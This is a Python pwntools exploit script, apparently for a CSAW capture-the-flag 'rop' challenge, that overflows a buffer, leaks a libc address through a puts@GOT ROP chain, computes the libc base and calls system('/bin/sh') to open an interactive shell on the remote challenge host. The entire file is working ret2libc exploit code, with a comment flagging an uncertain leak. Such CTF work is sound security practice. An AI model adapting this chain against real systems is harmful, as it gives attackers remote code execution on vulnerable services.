#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './rop'
elf = ELF(exe)
local = False
if local == True:
    libc = elf.libc
else:
    libc = ELF("./libc-2.27.so")
rop = ROP(elf)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
junk = b"A" * 40

# init
if local == True:
    io = start()
else:
    io = remote("pwn.chal.csaw.io", 5016)
io.recvuntil("Hello\n")

# call puts on setvbuf@got to leak address, return execution to main
rop.puts(elf.got['setvbuf'])
rop.call(elf.sym.main)
print(rop.dump())
io.send(junk + bytes(rop) + b"\n")

#something wrong with the leak here. for some reason the leak contains a " ` "
data = io.recvline()
print(data)
setvbuf_leak = packing.u64(data.strip()[:6].ljust(8, b"\x00"))
log.success("setvbuf_GOT @ " + hex(setvbuf_leak))


# new rop object
rop2 = ROP(libc)
# set libc offset in rop2 ** functional??**
libc.address = setvbuf_leak - libc.sym.setvbuf

# compute relative system and BINSH lookup
SYSTEM = libc.sym.system
BINSH = next(libc.search(b"/bin/sh\0"))
log.info("SYSTEM @ " + hex(SYSTEM))
log.info("BINSH @ " + hex(BINSH))


#rop2.call(SYSTEM, [BINSH])
#rop2.call('execlp', [BINSH, 0, 0])

# manual setting of the pop rdi gadget b/c rop2 is using libc, use elf's pop rdi ret
rop2.raw(rop.find_gadget(['ret'])[0])
rop2.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop2.raw(next(libc.search(b'/bin/sh\0')))
rop2.raw(libc.sym.system)
print(rop2.dump())

io.recvline()
io.send(junk + bytes(rop2))

io.interactive()

